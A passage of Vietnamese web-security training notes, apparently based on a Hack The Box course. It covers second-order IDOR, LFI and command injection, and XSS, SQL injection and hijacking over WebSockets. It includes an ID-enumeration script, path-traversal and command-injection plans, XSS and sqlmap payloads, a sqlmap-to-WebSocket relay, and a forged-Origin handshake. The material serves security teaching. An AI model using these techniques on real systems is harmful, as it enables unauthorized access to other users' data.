    header("Location: index.php");
    exit;
}
$_SESSION['id'] = $_GET['id']; // Thiết lập ID phiên

if(check_access($_SESSION['id'], $_SESSION['user'])){
    header("Location: display_data.php");
    exit;
} else {
    header("Location: error.php");
    exit;
}
```

Biến phiên `id` được thiết lập trước khi kiểm tra quyền truy cập được thực hiện. Điều này cho phép kẻ tấn công truy cập tệp ngay cả khi quyền truy cập bị từ chối.

#### **Khai thác lỗ hổng:**
Để khai thác lỗ hổng này, chúng ta sẽ:
1. Thay đổi tham số `id` trong URL thành ID tệp của người dùng khác.
2. Đảm bảo không theo dõi chuyển hướng đến `error.php`, giúp biến phiên `id` vẫn không thay đổi.
3. Truy cập trực tiếp `display_data.php` để xem tệp mà mình không có quyền truy cập.

### **Bước 3: Bằng chứng khai thác**

Bằng cách vượt qua chuyển hướng đến `error.php`, chúng ta có thể trực tiếp truy cập bất kỳ tệp nào bằng cách thay đổi tham số `id`. Ví dụ, khi cố gắng truy cập `id=1`, thuộc về người dùng `admin`, chúng ta có thể xem tệp của người dùng `admin` (ví dụ: "Công thức Bánh Apple Bí Mật").

**Khai thác** hoạt động bằng cách đảm bảo rằng biến phiên `id` vẫn giữ nguyên sau khi kiểm tra quyền truy cập thất bại. Điều này cho phép kẻ tấn công khai thác lỗ hổng Second-Order IDOR, vượt qua các cơ chế kiểm tra quyền truy cập.

### **Second-Order IDOR (Tiếp cận Blackbox)**

Bây giờ, chúng ta sẽ thảo luận về cách phát hiện lỗ hổng Second-Order IDOR **mà không có quyền truy cập vào mã nguồn** (tức là cách tiếp cận blackbox). Trong trường hợp này, chúng ta sẽ khám phá ứng dụng mà không thấy mã nguồn bên dưới nhưng cố gắng suy ra các tham chiếu đối tượng và cách thức thao tác chúng.

#### **Khám phá ứng dụng web:**
- Khi truy cập các tệp, chúng ta nhận thấy tham số GET của tệp là một **hash** (ví dụ: MD5 hash).
- Chúng ta cũng nhận thấy rằng có một bản xem trước tệp trong hồ sơ người dùng hiển thị vài ký tự đầu tiên của tệp gần nhất mà họ đã truy cập.

Sau đó, chúng ta suy ra rằng hash này là **MD5** của ID tệp. Để liệt kê các tệp, chúng ta có thể viết một đoạn mã để tạo các hash và thử truy cập các tệp.

#### **Ví dụ mã liệt kê tệp:**
```python
import hashlib
import requests

URL = "http://example.com/file.php"
COOKIE = {"PHPSESSID": "session-id-here"}

# Thử liệt kê các tệp
for file_id in range(1, 1000):
    id_hash = hashlib.md5(str(file_id).encode()).hexdigest()
    r = requests.get(URL, params={"file": id_hash}, cookies=COOKIE)
    if "File does not exist!" not in r.text:
        print(f"Found file with id: {file_id} -> {id_hash}")
```

Đoạn mã này tạo các hash MD5 cho ID tệp và thực hiện các yêu cầu đến ứng dụng web. Nếu phản hồi không chỉ ra rằng tệp không tồn tại, chúng ta biết rằng tệp đó là hợp lệ.

#### **Khai thác Second-Order IDOR:**
Sau khi phát hiện ID tệp hợp lệ, chúng ta có thể thử truy cập vào một tệp mà mình không sở hữu. Tuy nhiên, nếu cố gắng truy cập vào tệp của người dùng khác, có thể chúng ta sẽ gặp phải một kiểm tra quyền truy cập. Nhưng như đã thấy trước đó, các tệp vẫn có thể xuất hiện trong hồ sơ người dùng nếu ứng dụng không có kiểm tra quyền truy cập bổ sung cho **các tệp đã truy cập gần đây**.

Điều này có thể bị khai thác bằng cách thao tác với hệ thống xem trước tệp, không có kiểm tra quyền truy cập bổ sung, để xem tệp của người dùng khác.

---
# 10. Phân tích LFI thứ hai (Second-Order LFI)

LFI (Local File Inclusion) là một lỗ hổng bảo mật cho phép kẻ tấn công tải các tệp từ hệ thống tệp của máy chủ vào ứng dụng web. LFI có thể dễ dàng bị phát hiện và khai thác, nhưng khi bị các biện pháp bảo vệ như Web Application Firewall (WAF) ngăn chặn việc sử dụng ký tự đặc biệt như `../`, các cuộc tấn công LFI có thể gặp phải khó khăn. Tuy nhiên, những lỗ hổng LFI phức tạp hơn, như **Second-Order LFI**, có thể khó nhận diện và khai thác hơn. Trong phần này, chúng ta sẽ đi sâu vào một ví dụ về **Second-Order LFI**.

### **Xem xét Mã nguồn – Xác định Lỗ hổng**

Sau khi xem xét ứng dụng web, chúng ta nhận thấy rằng ứng dụng đã được chỉnh sửa so với các ví dụ trước. Bây giờ, người dùng có thể thay đổi tên người dùng cũng như tên tệp đã lưu trữ. Chúng ta sẽ phân tích mã nguồn để tìm xem liệu có cách nào để khai thác lỗ hổng LFI trên hệ thống tệp của máy chủ không. Từ đó, ta có thể thấy ứng dụng web không còn truy vấn dữ liệu từ cơ sở dữ liệu, mà thay vào đó, lưu trữ tệp trực tiếp trên hệ thống tệp.

Trong mã nguồn `db.php`, chúng ta thấy rằng ứng dụng lưu trữ các tệp trong thư mục được đặt tên theo chủ sở hữu của tệp, điều này tạo ra một điểm tiềm ẩn cho một lỗ hổng LFI. Dưới đây là đoạn mã liên quan:

```php
function fetch_data($id){
    global $conn;
    $sql = "SELECT * FROM data WHERE id=?;";
    $stmt = mysqli_stmt_init($conn);
    if(!mysqli_stmt_prepare($stmt, $sql)){
        echo "SQL Error";
        exit();
    }
    // Thực thi truy vấn
    $id = intval($id);
    mysqli_stmt_bind_param($stmt, "i", $id);
    mysqli_stmt_execute($stmt);
    $result = mysqli_stmt_get_result($stmt);
    $result = mysqli_fetch_assoc($result);
    $owner = $result['owner'];
    $name = $result['name'];
}
```

### **Thử khai thác LFI**

Để thử khai thác lỗ hổng LFI, chúng ta bắt đầu với việc thay đổi tên tệp, thay vì tên người dùng. Nếu chúng ta thay đổi tên tệp thành `../../../path/to/textfile`, ví dụ, chúng ta có thể tiết lộ tệp hệ thống như sau:

Đoạn mã `edit_filename.php` có thể như sau:

```php
function update_filename($id, $user, $new_filename, $old_filename){
    // Chuyển tệp đến vị trí mới
    $old_path = '/var/www/' . $user . '/' . $old_filename . '.txt';
    $new_path = '/var/www/' . $user . '/' . $new_filename . '.txt';
    rename($old_path, $new_path);
}
```

Ứng dụng từ chối các tên tệp chứa ký tự đặc biệt như `..` hoặc `/` để tránh LFI. Tuy nhiên, chúng ta có thể tiếp tục kiểm tra các tính năng khác, chẳng hạn như thay đổi tên người dùng.

### **Lỗ hổng trong việc thay đổi tên người dùng**

Khi kiểm tra mã trong `edit_username.php`, chúng ta nhận thấy rằng tên người dùng không bị lọc các ký tự đặc biệt, điều này có thể cho phép chúng ta tiêm chuỗi như `../` vào tên người dùng, giúp chúng ta thay đổi thư mục mà tệp được đọc từ đó.

```php
function update_username($user, $new_username){
    global $conn;
    // Kiểm tra xem tên người dùng đã tồn tại chưa
    if (fetch_user_data($new_username)){
        return false;
    }
    // Cập nhật tên người dùng
    $sql = "UPDATE users SET username=? WHERE username=?;";
    <SNIP>
    // Cập nhật tệp
    $sql = "UPDATE data SET owner=? WHERE owner=?;";
    <SNIP>
    return true;
}
```

Ở đây có một lỗi rõ ràng: khi thay đổi tên người dùng, ứng dụng không cập nhật đường dẫn tệp tương ứng với tên người dùng mới. Điều này dẫn đến việc nếu chúng ta thay đổi tên người dùng thành một tên khác, chẳng hạn `test`, ứng dụng sẽ cố gắng tìm tệp trong thư mục `/var/www/test/`, nơi không có tệp, dẫn đến lỗi. Tuy nhiên, lỗ hổng này có thể bị lợi dụng nếu tên người dùng chứa chuỗi như `../../`, cho phép thay đổi thư mục mà ứng dụng web tìm tệp.

### **Kế hoạch khai thác Second-Order LFI**

Giả sử người dùng `htb-stdnt` sở hữu một tệp tên là `test.txt` tại đường dẫn `/var/www/htb-stdnt/test.txt`. Nếu chúng ta thay đổi tên tệp thành `HelloWorld.txt`, tệp sẽ được di chuyển tới `/var/www/htb-stdnt/HelloWorld.txt`. Tuy nhiên, khi chúng ta thay đổi tên người dùng thành `test`, ứng dụng sẽ cố gắng truy cập tệp từ thư mục `/var/www/test/HelloWorld.txt`, nơi không tồn tại tệp.

Điều này không phải là vấn đề bảo mật trực tiếp, nhưng ta có thể sử dụng lỗ hổng này để khai thác LFI. Dưới đây là kế hoạch khai thác:

1. Đổi tên tệp của chúng ta thành `poc.txt`.
2. Đổi tên người dùng thành `../../tmp`, điều này sẽ thay đổi thư mục mà tệp được đọc từ `/var/www/htb-stdnt/` thành `/tmp/`.
3. Truy cập tệp `poc.txt`, ứng dụng sẽ cố gắng tải tệp từ đường dẫn `/var/www/../../tmp/poc.txt`, giúp chúng ta truy cập tệp hệ thống mục tiêu.

### **Thử nghiệm khai thác**

Để thử nghiệm khai thác này trên hệ thống của chúng ta, chúng ta có thể thực hiện theo các bước sau:

1. Tạo tệp `poc.txt` với nội dung như sau:

   ```bash
   echo 'The Exploit Works!' > /tmp/poc.txt
   ```

2. Cấu hình cơ sở dữ liệu MySQL với các bảng cần thiết (`data` và `users`).

3. Cấu hình Docker container MySQL để lưu trữ dữ liệu.

4. Tạo tệp `/var/www/htb-stdnt/Lorem Ipsum.txt` để ứng dụng có thể truy cập.

5. Thực hiện khai thác bằng cách thay đổi tên người dùng và tên tệp theo kế hoạch.

---

# 11. Second-Order Command Injection

Lỗ hổng second-order command injection có thể không rõ ràng ngay từ đầu, nhưng khi một ứng dụng web thực thi các lệnh hệ thống, chúng ta cần phải kiểm tra các điểm đầu vào xem có khả năng tiêm mã lệnh hay không. Lỗ hổng này không phải lúc nào cũng dễ nhận thấy, đặc biệt là khi các lệnh tiêm có thể bị chặn ngay tại các điểm đầu vào rõ ràng. Tuy nhiên, nhiều ứng dụng web thực hiện các tác vụ nền tương tác với hệ điều hành mà người tấn công không thể dễ dàng biết được, vì các tác vụ này không được hiển thị trong giao diện người dùng của ứng dụng web.

### Kiểm tra ứng dụng web

Sau khi đăng ký một người dùng thử trong ứng dụng web mẫu, ta thấy rằng có một bảng điều khiển quản trị đơn giản. Trong endpoint **/ping**, ứng dụng web cho phép ta nhập một địa chỉ IP và thực thi lệnh ping với địa chỉ IP đó. Đây là một điểm đầu vào rõ ràng có thể dẫn đến lỗ hổng lệnh tiêm, vì ứng dụng thực thi lệnh `ping` mà không thực hiện kiểm tra đầy đủ.

### Phát hiện lỗ hổng

Lúc đầu, ta thử tiêm một số payload đơn giản để thực thi lệnh hệ thống như `whoami`, nhưng ứng dụng web từ chối payload của chúng do các ký tự không hợp lệ. Điều này cho thấy ứng dụng có một bộ lọc ngăn chặn các ký tự đặc biệt.

Để kiểm tra khả năng tiêm lệnh, ta có thể sử dụng công cụ fuzzing như **wfuzz** để tìm kiếm ký tự nào có thể vượt qua bộ lọc. Ta thử sử dụng wordlist **special-chars.txt** từ **SecLists** và ghi nhận kết quả.

```
$wfuzz -u http://172.17.0.2:1337/update -w ./special-chars.txt -d '{"deviceIP":"FUZZ","password":""}' -H 'Content-Type: application/json' -b 'session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imh0Yi1zdGRu...'
```

Kết quả cho thấy rằng chỉ có dấu chấm (.) là ký tự đặc biệt duy nhất được phép, do đó chúng ta không thể tiêm payload gây thực thi mã.

### Phân tích sâu hơn

Tuy nhiên, nếu phân tích lưu lượng mạng kỹ lưỡng, chúng ta có thể nhận thấy một hành vi thú vị khi đăng xuất khỏi ứng dụng web. Khi đăng xuất, ứng dụng web sẽ trả về một thông điệp gỡ lỗi chứa đường dẫn trên máy chủ web, điều này có thể gây rò rỉ thông tin về cách thức ứng dụng ghi log dữ liệu của người dùng.

Mặc dù ứng dụng không có chức năng sửa đổi dữ liệu người dùng, chúng ta có thể thử đăng ký một người dùng mới và tiêm payload vào các trường **name** và **username** trong quá trình đăng ký. Sau khi đăng nhập và đăng xuất lại, thông điệp gỡ lỗi trả về sẽ thực thi lệnh tiêm mà chúng ta đã chèn vào.

### Khai thác lỗ hổng

Để khai thác lỗ hổng, ta thực hiện theo các bước sau:

1. Đăng ký một người dùng mới với tên và username có chứa payload lệnh tiêm, ví dụ: sử dụng dấu backticks `` ` ``.
2. Đăng nhập và đăng xuất khỏi ứng dụng.
3. Lúc này, ứng dụng web sẽ thực thi lệnh mà ta đã tiêm và trả về kết quả trong thông báo gỡ lỗi.

Lỗ hổng này là do ứng dụng thiếu kiểm tra và bảo vệ đối với các cơ chế ghi log nền trong khi thực hiện các thao tác như đăng xuất của người dùng. Dù ứng dụng đã bảo vệ chống lại tiêm lệnh trực tiếp qua các đầu vào rõ ràng, nhưng nó lại không kiểm tra kỹ các cơ chế nền này, dẫn đến lỗ hổng nghiêm trọng.

---
# 12. Giới Thiệu về WebSockets

**WebSocket** là một giao thức tầng ứng dụng cho phép giao tiếp hai chiều giữa các client WebSocket và các máy chủ WebSocket. Việc hiểu cách thức hoạt động của WebSockets và cách thức thiết lập kết nối của chúng sẽ giúp bạn nhận diện các lỗ hổng có thể xuất hiện trong các ứng dụng web sử dụng WebSockets.

### WebSockets là gì?

Thông thường, trình duyệt giao tiếp với máy chủ web qua giao thức **HTTP**. Trước khi có **HTTP/2**, máy chủ chỉ có thể gửi dữ liệu để phản hồi yêu cầu của client; do đó, các phiên bản **HTTP/1.1** trở xuống không cung cấp cho máy chủ khả năng đẩy dữ liệu tới client một cách không yêu cầu. Tuy nhiên, một tính năng trong HTTP/2 gọi là **Server Push** cho phép máy chủ chủ động gửi tài nguyên mà không cần yêu cầu từ client. Thay vì sử dụng mô hình yêu cầu-phản hồi (request-response), giao thức **WebSocket** cho phép truyền tải dữ liệu hai chiều (full-duplex) giữa máy chủ và client mà không cần yêu cầu trước từ một bên. Các kết nối WebSocket thường được giữ mở trong thời gian dài và cho phép truyền dữ liệu ở bất kỳ thời điểm nào và theo bất kỳ hướng nào.

Ví dụ, hãy tưởng tượng một ứng dụng web phòng chat đơn giản sử dụng HTTP/1.1, chạy trên trình duyệt của hai người tham gia, Alice và Bob. Khi Alice gửi một tin nhắn đến Bob, trình duyệt của Alice truyền tin nhắn tới máy chủ web. Tuy nhiên, máy chủ web không thể gửi tin nhắn đến Bob cùng lúc vì không thể tự động gửi mà không có yêu cầu từ phía Bob. Do đó, trình duyệt của Bob phải thực hiện **polling** định kỳ để kiểm tra xem có tin nhắn mới không.

Nếu ứng dụng này sử dụng kết nối **WebSocket**, thì ngay sau khi Alice và Bob đăng nhập, mỗi người sẽ thiết lập một kết nối WebSocket với máy chủ. Sau đó, trình duyệt của Alice sẽ gửi tin nhắn cho Bob qua kết nối WebSocket mà không cần phải thực hiện các yêu cầu polling. Vì vậy, WebSockets rất hữu ích cho các ứng dụng thời gian thực.

Kết nối WebSocket có thể được nhận diện qua các giao thức **ws://** và **wss://**. 

- **ws://** được sử dụng cho giao tiếp WebSocket qua kết nối HTTP không mã hóa/insecure.
- **wss://** được sử dụng cho giao tiếp WebSocket qua kết nối HTTPS mã hóa/secure.

Kết nối tới cả máy chủ HTTP và HTTPS đều có thể thiết lập kết nối WebSocket. Tuy nhiên, khi kết nối tới máy chủ HTTP, kết nối WebSocket thường được coi là không an toàn (ws://) vì không sử dụng mã hóa. Ngược lại, khi kết nối tới máy chủ HTTPS, kết nối WebSocket cần phải được thiết lập một cách an toàn (wss://) để đảm bảo mã hóa và bảo mật dữ liệu.

### Thiết Lập Kết Nối WebSocket

Kết nối WebSocket bắt đầu với một quá trình bắt tay ban đầu (handshake), trong đó có một cuộc trao đổi các thông điệp cụ thể giữa client và server để nâng cấp kết nối từ HTTP sang WebSocket.

Trình duyệt web có thể thử thiết lập kết nối WebSocket qua nhiều phương thức khác nhau; ví dụ, họ có thể sử dụng đối tượng **WebSocket** phía client trong JavaScript:

```javascript
const socket = new WebSocket('ws://websockets.htb/echo');
```

Lệnh **WebSocket** bắt đầu quá trình bắt tay HTTP với một yêu cầu giống như sau:

```
GET /echo HTTP/1.1
Host: websockets.htb
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: 7QpTshdCiQfiv3tH7myJ1g==
Origin: http://websockets.htb
```

Yêu cầu này chứa các tiêu đề quan trọng sau:

- **Connection** với giá trị là **Upgrade** và **Upgrade** với giá trị là **websocket** cho biết ý định của client là thiết lập một kết nối WebSocket.
- **Sec-WebSocket-Version** chứa phiên bản giao thức WebSocket mà client chọn, với phiên bản mới nhất là **13**.
- **Sec-WebSocket-Key** chứa một giá trị duy nhất xác nhận rằng client muốn thiết lập kết nối WebSocket. Tiêu đề này không cung cấp bảo mật.
- **Origin** chứa nguồn gốc của yêu cầu, tương tự như trong các yêu cầu HTTP thông thường và được sử dụng cho các mục đích bảo mật.

Máy chủ sẽ phản hồi với một thông điệp như sau:

```
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: QU/gD/2y41z9ygrOaGWgaC+Pm2M=
```

Thông điệp phản hồi chứa các thông tin sau:

- Mã trạng thái HTTP là **101**, cho biết việc nâng cấp giao thức từ HTTP sang WebSocket đã thành công.

Sau phản hồi của máy chủ, kết nối WebSocket đã được thiết lập và hai bên có thể bắt đầu trao đổi các thông điệp.

---
# 13. Tấn Công XSS qua WebSockets

Giống như bất kỳ đầu vào không được kiểm tra nào, việc nhúng các thông điệp từ một kết nối WebSocket vào một trang web có thể dẫn đến **Cross-Site Scripting (XSS)**. Nếu một kẻ tấn công có thể gửi một payload XSS độc hại tới người dùng khác, khiến nó được nhúng vào **Document Object Model (DOM)** của trình duyệt của họ, thì đây sẽ là một vector tấn công XSS hợp lệ.

### Kiểm Tra Mã Nguồn - Xác Định Lỗ Hổng

Chúng ta sẽ tấn công một ứng dụng web chat sử dụng kết nối WebSocket. Khi truy cập ứng dụng, chúng ta thấy nó cho phép gửi tin nhắn đến người quản trị (admin):

- Trong ứng dụng này, khi người dùng gửi tin nhắn, nó sẽ được hiển thị trong trình duyệt của admin. Đây có thể là điều kiện cần để xảy ra tấn công XSS.
- Chúng ta sẽ phân tích mã nguồn để xác định xem dữ liệu gửi đi trong tin nhắn có được kiểm tra và xử lý đúng cách hay không.

#### Mã Python (Server Side)

Mã Python dưới đây mô tả cách các kết nối WebSocket được xử lý, đặc biệt là các thông điệp từ người dùng được chuyển đến admin:

```python
to_admin = queue.Queue()
to_user = queue.Queue()

@sock.route('/userws')
def userws(sock):
    while True:
        if not to_user.empty():
            msg = to_user.get()
            sock.send(msg)
        msg = sock.receive(timeout=1)
        if msg:
            to_admin.put(msg)

@sock.route('/adminws')
def adminws(sock):
    while True:
        if not to_admin.empty():
            msg = to_admin.get()
            sock.send(msg)
        msg = sock.receive(timeout=1)
        if msg:
            to_user.put(msg)
```

- Các endpoint WebSocket được định nghĩa: `/userws` cho người dùng và `/adminws` cho admin.
- Các tin nhắn từ người dùng được đưa vào hàng đợi `to_admin` và sau đó được gửi tới admin qua kết nối WebSocket.

#### Mã JavaScript (Client Side)

Mã JavaScript trong `index.html` xử lý việc gửi và nhận tin nhắn qua WebSocket:

```javascript
var form = document.getElementById("chatform");
form.addEventListener('submit', sendMessage);

const socket = new WebSocket('ws://' + location.host + '/userws');
socket.addEventListener('message', ev => {
    log('Admin', ev.data);
});

function log(user, msg){
    var today = new Date();
    var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
    document.getElementById('chat').innerHTML += `<div class="chatmessage clearfix"><div class="chat-message-content clearfix"><span class="chat-time">${time}</span><h5>${user}</h5><p>${msg}</p></div></div><hr>`;
}

function sendMessage(event){
    event.preventDefault();
    let msg = document.getElementById("msg").value;
    socket.send(msg);
    log('You', msg);
    document.getElementById("msg").value = '';
}
```

- Các tin nhắn nhận được qua WebSocket sẽ được hiển thị trong DOM của trang thông qua thuộc tính `innerHTML` mà không có bất kỳ việc kiểm tra hoặc vệ sinh dữ liệu nào.
- Điều này dẫn đến **XSS** vì tin nhắn có thể chứa mã HTML hoặc JavaScript độc hại mà không được lọc.

### Debugging Mã Nguồn

Chạy ứng dụng web tại chỗ giúp chúng ta kiểm tra các thông điệp trong DOM của trình duyệt sau khi nhận tin nhắn. Quá trình này có thể kết hợp giữa kiểm tra động (dynamic analysis) và phân tích mã JavaScript phía client (static analysis).

#### Xác nhận việc thiếu vệ sinh đầu vào

Khi gửi một thẻ HTML vô hại, ví dụ như `<strike>PoC</strike>`, từ tài khoản người dùng đến admin, ta thấy rằng thẻ HTML này được hiển thị mà không bị ngăn chặn. Điều này xác nhận rằng không có bất kỳ quy trình vệ sinh nào được áp dụng:

### Tấn Công XSS

Giờ đây, với một **PoC** (Proof of Concept) hoạt động, chúng ta có thể thử các payload XSS mạnh mẽ hơn. Khi gửi payload XSS phổ biến như `<script>alert(1)</script>`, chúng ta thấy rằng thông điệp hiển thị từ phía admin là một thông điệp trống (rỗng), vì thẻ `<script>` bị ẩn.

Tuy nhiên, không có pop-up cảnh báo do một biện pháp bảo mật của HTML5 nhằm ngăn chặn các tấn công XSS: "Các thẻ `<script>` chèn qua `innerHTML` không được thực thi khi chúng được chèn vào." Mặc dù vậy, vẫn có những payload XSS khác sử dụng **event handlers**.

### Lợi Dụng Event Handlers

Trong trường hợp này, thay vì sử dụng thẻ `<script>`, kẻ tấn công có thể thử sử dụng các payload XSS khác mà không cần sử dụng thẻ `<script>`, mà thay vào đó là các sự kiện JavaScript như:

```html
<img src="x" onerror="alert(1)">
```

Khi thông điệp này được gửi và hiển thị trong DOM, thuộc tính `onerror` của thẻ `<img>` sẽ kích hoạt và thực thi mã JavaScript, mở cửa cho một cuộc tấn công XSS. 

--- 
# 14. Tấn Công SQLi qua WebSockets

Việc chèn dữ liệu đầu vào từ người dùng không được kiểm tra vào các câu truy vấn SQL thông qua kết nối WebSocket có thể dẫn đến **SQL Injection (SQLi)**, giống như các yêu cầu HTTP thông thường. Tuy nhiên, vì sự thiếu hỗ trợ của WebSockets trong nhiều công cụ khai thác, việc lợi dụng lỗ hổng SQLi qua WebSockets thường gặp phải nhiều thử thách hơn.

### Kiểm Tra Mã Nguồn - Xác Định Lỗ Hổng

Ứng dụng web trong ví dụ này không cho phép người dùng gửi tin nhắn cho người khác, mà chỉ hiển thị các tin nhắn có sẵn dành cho một người dùng nhất định. Ví dụ, khi cung cấp tên người dùng **htb-stdnt**, hai tin nhắn sẽ được hiển thị:

- Nếu cung cấp một tên người dùng không hợp lệ như **doesnotexist**, ứng dụng sẽ trả về một thông báo lỗi.

#### Phân Tích Mã Nguồn

Có một endpoint WebSocket để xử lý tên người dùng mà client gửi đến. Khi nhận được dữ liệu qua kết nối WebSocket, server sẽ cố gắng phân tích cú pháp chuỗi JSON và sau đó truyền thuộc tính `username` vào một câu lệnh SQL thông qua hàm `query`. Sau khi thực thi câu lệnh, kết quả sẽ được trả về dưới dạng một đối tượng JSON nếu không có lỗi.

### Debugging Mã Nguồn Tại Chỗ

Để chạy ứng dụng Python ở môi trường cục bộ, chúng ta cần cài đặt ba phụ thuộc sau bằng pip: **Flask**, **flask-sock**, và **mysql-connector-python**.

Ứng dụng web cố gắng kết nối tới một instance MySQL trên localhost. Thay vì cài đặt MySQL trực tiếp trên máy tính của mình, chúng ta có thể sử dụng một container Docker MySQL với các tham số sau:

```bash
docker run -p 3306:3306 -e MYSQL_USER='db' -e MYSQL_PASSWORD='db-password' -e MYSQL_DATABASE='db' -e MYSQL_ROOT_PASSWORD='db' mysql
```

Lệnh trên sẽ tạo một máy chủ MySQL mới với các thông tin đăng nhập được cung cấp trong mã nguồn. Tuy nhiên, cơ sở dữ liệu ban đầu là rỗng. Để kiểm tra kỹ lưỡng hơn, chúng ta có thể cài đặt dữ liệu mẫu vào cơ sở dữ liệu.

Sau khi thay đổi cổng để sử dụng một cổng không ưu tiên, chúng ta có thể khởi động ứng dụng web và kiểm tra tại các địa chỉ cục bộ. Để xác nhận lỗ hổng SQLi, chúng ta thử nghiệm với payload **" UNION SELECT "1** như một tên người dùng.

### Tấn Công SQLi

**sqlmap** là công cụ thường dùng để khai thác các lỗ hổng SQLi. Tuy nhiên, đôi khi **sqlmap** gặp khó khăn khi xử lý các kết nối WebSocket. Để giải quyết vấn đề này, chúng ta có thể viết một middleware trên máy cục bộ để nhận payload SQLi từ tham số HTTP request và mở kết nối WebSocket tới ứng dụng web dễ bị tấn công, sau đó chuyển tiếp payload qua WebSocket.

#### Middleware với Flask và WebSocket

Middleware này là một ứng dụng Flask đơn giản với một endpoint duy nhất. Endpoint này phân tích tham số `username` trong GET request và chuyển tiếp dữ liệu dưới dạng JSON tới ứng dụng web dễ bị tấn công qua kết nối WebSocket:

```python
from flask import Flask, request
from websocket import create_connection
import json

app = Flask(__name__)
WS_URL = 'ws://172.17.0.2/dbconnector'

@app.route('/')
def index():
    req = {}
    req['username'] = request.args.get('username', '')
    ws = create_connection(WS_URL)
    ws.send(json.dumps(req))
    r = json.loads(ws.recv())
    ws.close()
    if r.get('error'):
        return r['error']
    return r['messages']

app.run(host='127.0.0.1', port=8000)
```

Trong middleware này, chúng ta sử dụng thư viện **websocket-client** để kết nối và gửi dữ liệu qua WebSocket, sau đó nhận phản hồi từ server và trả về kết quả.

#### Sử dụng sqlmap

Sau khi cài đặt middleware, chúng ta có thể chạy **sqlmap** để khai thác lỗ hổng SQLi. Câu lệnh sqlmap sẽ trỏ tới middleware cục bộ và sử dụng tham số `username` để gửi payload:

```bash
sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt
```

**sqlmap** xác định các điểm chèn (injection points) như sau:

- **boolean-based blind**: `username=htb-stdnt' AND 1426=1426 AND 'pYBp'='pYBp`
- **time-based blind**: `username=htb-stdnt' AND (SELECT 4655 FROM (SELECT(SLEEP(5)))yezp) AND 'EeMR'='EeMR`
- **UNION query**: `username=htb-stdnt' UNION ALL SELECT CONCAT(0x7171626a71,0x6c634b4f4c7662574678666a5164434a61734962797249524770...)`

sqlmap xác định rằng hệ quản trị cơ sở dữ liệu (DBMS) đang sử dụng là **MySQL >= 5.0.12** và tiếp tục khai thác SQLi.

### Thực Thi Tấn Công từ Xa

Sau khi đã phát hiện lỗ hổng và thực hiện kiểm tra với sqlmap, chúng ta có thể thay đổi `WS_URL` trong middleware để trỏ tới hệ thống từ xa và thực hiện lại cùng một câu lệnh **sqlmap** để khai thác ứng dụng web dễ bị tấn công từ xa.

---
# 15. Cross-Site WebSocket Hijacking (CSWH)

**Cross-Site WebSocket Hijacking (CSWH)** là một lỗ hổng bảo mật liên quan đến WebSocket, có thể được khai thác thông qua một **Cross-Site Request Forgery (CSRF)** tấn công trong quá trình bắt tay WebSocket (WebSocket handshake). Mặc dù chính sách **Same-Origin Policy** (SOP) ngăn cản các tấn công CSRF trong các yêu cầu HTTP thông thường (yêu cầu chéo miền không thể truy cập phản hồi), nhưng WebSocket lại không bị hạn chế chặt chẽ như vậy. Điều này khiến các tấn công CSWH có thể cho phép kẻ tấn công đọc và ghi dữ liệu trên kết nối WebSocket của người dùng mà không cần phải có quyền truy cập trực tiếp vào session của người dùng.

### **Phân Tích Mã Nguồn - Xác Định Lỗ Hổng**

Trong ứng dụng web mẫu này, người dùng phải đăng nhập để xem tin nhắn của mình. Thay vì gửi tên người dùng trực tiếp qua kết nối WebSocket, ứng dụng sẽ lấy và hiển thị tất cả các tin nhắn dành cho người dùng đã đăng nhập.

Dưới đây là mã nguồn của các câu truy vấn sử dụng trong ứng dụng:

#### Mã nguồn của hàm `login`:
```python
def login(username, password):
    mydb = mysql.connector.connect(
        host="127.0.0.1",
        user="db",
        password="db-password",
        database="db"
    )
    mycursor = mydb.cursor(prepared=True)
    query = 'SELECT * FROM users WHERE username=%s AND password=%s'
    mycursor.execute(query, (username, password))
    return mycursor.fetchone()
```

#### Mã nguồn của hàm `fetch_messages`:
```python
def fetch_messages(username):
    mydb = mysql.connector.connect(
        host="127.0.0.1",
        user="db",
        password="db-password",
        database="db"
    )
    mycursor = mydb.cursor(prepared=True)
    query = 'SELECT message FROM messages WHERE username=%s'
    mycursor.execute(query, (username,))
    return mycursor.fetchall()
```

Nhìn chung, ứng dụng sử dụng các câu lệnh SQL đã được chuẩn bị (prepared statements), giúp ngăn ngừa SQLi. Tuy nhiên, lỗ hổng không nằm ở SQLi mà ở bảo mật của **WebSocket handshake** và **session management**.

#### Phân Tích Endpoint WebSocket
```python
@sock.route('/messages')
def messages(sock):
    if not session.get('logged_in'):
        sock.send('{"error":"Unauthorized"}')
        return
    while True:
        response = {}
        try:
            data = sock.receive(timeout=1)
            if not data == '!get_messages':
                continue
            username = session.get('user', '')
            messages = fetch_messages(username)
            if not messages:
                response['error'] = "No messages for this user!"
            else:
                response['messages'] = [msg[0] for msg in messages]
            sock.send(json.dumps(response))
        except Exception as e:
            response['error'] = "An error occured!"
            sock.send(json.dumps(response))
```

Kết nối WebSocket sẽ chỉ được phép truy cập khi người dùng đã đăng nhập (session chứa `logged_in` là `True`). Tuy nhiên, ứng dụng này không có cơ chế bảo vệ chống lại các cuộc tấn công CSRF, chẳng hạn như xác minh **CSRF token** hay kiểm tra **Origin header** trong yêu cầu WebSocket. Điều này khiến ứng dụng dễ bị tấn công **CSWH**.

### **Kiểm Tra Lỗ Hổng CSWH Cục Bộ**

Để kiểm tra lỗ hổng CSWH, ta có thể khởi động ứng dụng web cục bộ và thực hiện yêu cầu WebSocket có **Origin header** giả mạo. Nếu ứng dụng chấp nhận kết nối mà không xác minh tính hợp lệ của Origin, tức là ứng dụng đã bị tấn công CSWH.

Ví dụ, ta gửi một yêu cầu WebSocket như sau:

```http
GET /messages HTTP/1.1
Host: 172.17.0.2:80
Connection: Upgrade
Upgrade: websocket
Origin: http://crossdomain.htb
Sec-WebSocket-Version: 13
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.ZEQwlQ.ZoJ2yDD1Ujx5wzp54vXWN97j1LM
Sec-WebSocket-Key: 7QpTshdCiQfiv3tH7myJ1g==
```

